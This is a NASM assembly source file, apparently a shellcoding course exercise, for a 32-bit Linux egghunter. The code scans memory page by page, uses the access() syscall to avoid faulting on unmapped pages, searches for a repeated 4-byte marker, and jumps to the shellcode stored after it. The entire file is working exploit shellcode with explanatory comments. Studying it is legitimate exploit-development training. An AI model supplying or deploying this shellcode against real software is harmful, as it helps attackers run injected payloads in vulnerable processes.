; Filename: egghunter.nasm
; Author: SLAE-14209

global _start

section .text

_start:

    xor eax, eax           ; zeroize EAX register
    xor ebx, ebx           ; zeroize EBX register
    xor ecx, ecx           ; zeroize ECX register
    xor edx, edx           ; zeroize EDX register

align_page:
    or dx, 0xfff           ; PAGE_SIZE 4095 bytes -> EDX
    
next_address:
    inc edx                ; EDX +1
    lea ebx,[edx+0x4]      ; cmp EBX and EDX+4
    push byte +0x21        ; syscall access()
    pop eax                ; pop 0x21 -> EAX 
    int 0x80               
    cmp al, 0xf2           ; cmp EAX=0xf2? (efault)
    jz align_page          ; if efault happens go back and start again
    mov eax,0x50905090     ; if no efault happen, then store into eax egg = 0x50905090
    mov edi, edx           ; EDX -> EDI
    scasd                  ; cmp EDI == EAX? EDI+4
    jnz next_address       ; if not match jump to next address
    scasd                  ; cmp EDI == EAX? EDI+4
    jnz next_address       ; if not match jump to next address
    jmp edi                ; if match jump to shellcode
